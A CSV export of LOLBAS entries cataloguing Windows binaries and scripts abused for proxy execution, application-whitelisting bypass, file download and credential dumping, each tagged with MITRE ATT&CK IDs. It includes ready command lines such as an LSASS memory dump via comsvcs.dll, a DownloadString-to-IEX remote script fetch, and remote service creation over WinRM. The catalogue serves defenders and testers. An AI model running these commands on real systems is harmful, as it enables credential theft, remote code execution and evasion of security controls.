Command,Name,Description,Usecase,Category,MitreID
Robocopy.exe C:\SourceFolder C:\DestFolder,Robocopy.exe,Copy the entire contents of the SourceFolder to the DestFolder.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Robocopy.yml
Robocopy.exe \\SERVER\SourceFolder C:\DestFolder,Robocopy.exe,Copy the entire contents of the SourceFolder to the DestFolder.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Robocopy.yml
explorer.exe calc.exe,Explorer.exe,Executes calc.exe as a subprocess of explorer.exe.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Explorer.yml
powershell -ep bypass - < c:\temp:ttt,Powershell.exe,Execute the encoded PowerShell command stored in an Alternate Data Stream (ADS).,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Powershell.yml
netsh.exe trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl IPv4.Address=!(<IPofRemoteFileShare>)
netsh.exe trace show status
,Netsh.exe,Capture network traffic on remote file share.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Netsh.yml
netsh.exe add helper C:\Path\file.dll,Netsh.exe,Load (execute) NetSh.exe helper DLL file.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Netsh.yml
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1,Netsh.exe,Forward traffic from the listening address and proxy to a remote system.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Netsh.yml
nltest.exe /SERVER:192.168.1.10 /QUERY,Nltest.exe,,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Nltest.yml
OpenWith.exe /c C:\test.hta,Openwith.exe,Opens the target file with the default application.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Openwith.yml
OpenWith.exe /c C:\testing.msi,Openwith.exe,Opens the target file with the default application.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Openwith.yml
winword.exe /l dllfile.dll,winword.exe,Launch DLL payload.,Execute a locally stored DLL using winword.exe.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Winword.yml
rundll32.exe shell32.dll*Control_RunDLL c:\path\to\payload.dll,Shell32.dll,Launch a DLL payload by calling the Control_RunDLL function.,Load a DLL payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml
rundll32.exe shell32.dll*ShellExec_RunDLL beacon.exe,Shell32.dll,Launch an executable by calling the ShellExec_RunDLL function.,Run an executable payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml
rundll32 SHELL32.DLL*ShellExec_RunDLL "cmd.exe" "/c echo hi",Shell32.dll,Launch command line by calling the ShellExec_RunDLL function.,Run an executable payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml
rundll32.exe dfshim.dll*ShOpenVerbApplication http://www.domain.com/application/?param1=foo,Dfshim.dll,Executes click-once-application from Url (trampoline for Dfsvc.exe. DotNet ClickOnce host),Use binary to bypass Application whitelisting,AWL Bypass,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Dfshim.yml
rundll32.exe zipfldr.dll*RouteTheCall calc.exe,Zipfldr.dll,Launch an executable payload by calling RouteTheCall.,Launch an executable.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml
rundll32.exe zipfldr.dll*RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e,Zipfldr.dll,Launch an executable payload by calling RouteTheCall (obfuscated).,Launch an executable.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml
rundll32.exe syssetup.dll*SetupInfObjectInstallAction DefaultInstall 128 c:\test\shady.inf,Syssetup.dll,Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,Run local or remote script(let) code through INF file specification (Note May pop an error window).,AWL Bypass,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
rundll32 syssetup.dll*SetupInfObjectInstallAction DefaultInstall 128 c:\temp\something.inf,Syssetup.dll,Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.,Load an executable payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
rundll32.exe setupapi.dll*InstallHinfSection DefaultInstall 128 C:\Tools\shady.inf,Setupapi.dll,Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,Run local or remote script(let) code through INF file specification.,AWL Bypass,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
rundll32.exe setupapi.dll*InstallHinfSection DefaultInstall 128 C:\Tools\calc_exe.inf,Setupapi.dll,Launch an executable file via the InstallHinfSection function and .inf file section directive.,Load an executable payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
rundll32 C:\windows\system32\comsvcs.dll MiniDump [LSASS_PID] dump.bin full,Comsvcs.dll,Calls the MiniDump exported function of comsvcs.dll. which in turns calls MiniDumpWriteDump.,Dump Lsass.exe process memory to retrieve credentials.,Dump,T1003.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/comsvcs.yml
rundll32.exe advpack.dll*LaunchINFSection c:\test.inf*DefaultInstall_SingleUser*1*,Advpack.dll,Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,Run local or remote script(let) code through INF file specification.,AWL Bypass,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
rundll32.exe advpack.dll*LaunchINFSection c:\test.inf**1*,Advpack.dll,Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).,Run local or remote script(let) code through INF file specification.,AWL Bypass,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
rundll32.exe advpack.dll*RegisterOCX test.dll,Advpack.dll,Launch a DLL payload by calling the RegisterOCX function.,Load a DLL payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
rundll32.exe advpack.dll*RegisterOCX calc.exe,Advpack.dll,Launch an executable by calling the RegisterOCX function.,Run an executable payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
rundll32 advpack.dll* RegisterOCX "cmd.exe /c calc.exe",Advpack.dll,Launch command line by calling the RegisterOCX function.,Run an executable payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
rundll32.exe shdocvw.dll*OpenURL "C:\test\calc.url",Shdocvw.dll,Launch an executable payload via proxy through a URL (information) file by calling OpenURL.,Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shdocvw.yml
rundll32.exe pcwutl.dll*LaunchApplication calc.exe,Pcwutl.dll,Launch executable by calling the LaunchApplication function.,Launch an executable.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Pcwutl.yml
rundll32.exe Mshtml.dll*PrintHTML "C:\temp\calc.hta",Mshtml.dll,Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box).,Launch an HTA application.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml
rundll32.exe ieframe.dll*OpenURL "C:\test\calc.url",Ieframe.dll,Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.,Load an executable payload by calling a .url file with or without quotes.  The .url file extension can be renamed.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieframe.yml
rundll32.exe desk.cpl*InstallScreenSaver C:\temp\file.scr,Desk.cpl,Launch an executable with a .scr extension by calling the InstallScreenSaver function.,Launch any executable payload. as long as it uses the .scr extension.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Desk.yml
rundll32.exe desk.cpl*InstallScreenSaver \\127.0.0.1\c$\temp\file.scr,Desk.cpl,Launch a remote executable with a .scr extension. located on an SMB share. by calling the InstallScreenSaver function.,Launch any executable payload. as long as it uses the .scr extension.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Desk.yml
rundll32.exe ieadvpack.dll*LaunchINFSection c:\test.inf*DefaultInstall_SingleUser*1*,Ieadvpack.dll,Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,Run local or remote script(let) code through INF file specification.,AWL Bypass,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
rundll32.exe ieadvpack.dll*LaunchINFSection c:\test.inf**1*,Ieadvpack.dll,Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).,Run local or remote script(let) code through INF file specification.,AWL Bypass,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
rundll32.exe ieadvpack.dll*RegisterOCX test.dll,Ieadvpack.dll,Launch a DLL payload by calling the RegisterOCX function.,Load a DLL payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
rundll32.exe ieadvpack.dll*RegisterOCX calc.exe,Ieadvpack.dll,Launch an executable by calling the RegisterOCX function.,Run an executable payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
rundll32 ieadvpack.dll* RegisterOCX "cmd.exe /c calc.exe",Ieadvpack.dll,Launch command line by calling the RegisterOCX function.,Run an executable payload.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
rundll32.exe url.dll*OpenURL "C:\test\calc.hta",Url.dll,Launch a HTML application payload by calling OpenURL.,Invoke an HTML Application via mshta.exe (Default Handler).,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Url.yml
rundll32.exe url.dll*OpenURL "C:\test\calc.url",Url.dll,Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.,Load an executable payload by calling a .url file with or without quotes.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Url.yml
rundll32.exe url.dll*OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e,Url.dll,Launch an executable by calling OpenURL.,Load an executable payload by specifying the file protocol handler (obfuscated).,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Url.yml
rundll32.exe url.dll*FileProtocolHandler calc.exe,Url.dll,Launch an executable by calling FileProtocolHandler.,Launch an executable.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Url.yml
rundll32.exe url.dll*FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e,Url.dll,Launch an executable by calling FileProtocolHandler.,Load an executable payload by specifying the file protocol handler (obfuscated).,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Url.yml
rundll32.exe url.dll*FileProtocolHandler file:///C:/test/test.hta,Url.dll,Launch a HTML application payload by calling FileProtocolHandler.,Invoke an HTML Application via mshta.exe (Default Handler).,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Url.yml
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()",UtilityFunctions.ps1,Proxy execute Managed DLL with PowerShell,Execute proxied payload with Microsoft signed binary,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/UtilityFunctions.yml
. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke <executable> [args],CL_Invocation.ps1,Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml
Pester.bat [/help|?|-?|/?] "$null; notepad",Pester.bat,Execute code using Pester. The third parameter can be anything. The fourth is the payload. Example here executes notepad,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/pester.yml
Pester.bat ;calc.exe,Pester.bat,Execute code using Pester. Example here executes calc.exe,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/pester.yml
Pester.bat ;calc.exe,Pester.bat,Execute code using Pester. Example here executes calc.exe,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/pester.yml
. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess calc.ps1,CL_Mutexverifiers.ps1,Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe"} -r:http://target:5985,winrm.vbs,Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml
winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985,winrm.vbs,Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,winrm.vbs,Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location. and executing winrm.vbs via the relocated cscript.exe.,Execute arbitrary. unsigned code via XSL script,AWL Bypass,T1220,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath "C:\windows\system32\calc.exe",Launch-VsDevShell.ps1,Execute binaries from the context of the signed script using the "VsWherePath" flag.,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Launch-VsDevShell.yml
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; calc.exe ;",Launch-VsDevShell.ps1,Execute binaries and commands from the context of the signed script using the "VsInstallationPath" flag.,Proxy execution,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Launch-VsDevShell.yml
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX",Syncappvpublishingserver.vbs,Inject PowerShell script code with the provided arguments,Use Powershell host invoked from vbs script,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Pubprn.vbs,Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection,Proxy execution,Execute,T1216.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()",CL_LoadAssembly.ps1,Proxy execute Managed DLL with PowerShell,Execute proxied payload with Microsoft signed binary,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_LoadAssembly.yml
set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf,Manage-bde.wsf,Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.,Proxy execution from script,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,Manage-bde.wsf,Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.,Proxy execution from script,Execute,T1216,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE",GfxDownloadWrapper.exe,GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by "Microsoft Windows Hardware". "Compatibility Publisher". "Microsoft Windows Third Party Component CA 2012". "Microsoft Time-Stamp PCA 2010". "Microsoft Time-Stamp Service".,Download file from internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/HonorableMentions/GfxDownloadWrapper.yml
ssh localhost calc.exe,ssh.exe,Execute calc.exe on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.,Execute specified command. can be used for defense evasion.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ssh.yml
ssh -o ProxyCommand=calc.exe .,ssh.exe,Executes calc.exe from ssh.exe,Performs execution of specified file. can be used as a defensive evasion.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ssh.yml
ATBroker.exe /start malware,Atbroker.exe,Start a registered Assistive Technology (AT).,Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Atbroker.yml
regasm.exe AllTheThingsx64.dll,Regasm.exe,Loads the target .DLL file and executes the RegisterClass function.,Execute code and bypass Application whitelisting,AWL Bypass,T1218.009,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regasm.yml
regasm.exe /U AllTheThingsx64.dll,Regasm.exe,Loads the target .DLL file and executes the UnRegisterClass function.,Execute code and bypass Application whitelisting,Execute,T1218.009,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regasm.yml
Extexport.exe c:\test foo bar,Extexport.exe,Load a DLL located in the c:\test folder with one of the following names mozcrt19.dll. mozsqlite3.dll. or sqlite.dll,Execute dll file,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extexport.yml
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Installutil.exe,Execute the target .NET DLL or EXE.,Use to execute code and bypass application whitelisting,AWL Bypass,T1218.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Installutil.yml
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Installutil.exe,Execute the target .NET DLL or EXE.,Use to execute code and bypass application whitelisting,Execute,T1218.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Installutil.yml
InstallUtil.exe https://example.com/payload,Installutil.exe,It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE),Downloads payload from remote server,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Installutil.yml
ilasm.exe C:\public\test.txt /exe,Ilasm.exe,Binary file used by .NET to compile C#/intermediate (IL) code to .exe,Compile attacker code on system. Bypass defensive counter measures.,Compile,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ilasm.yml
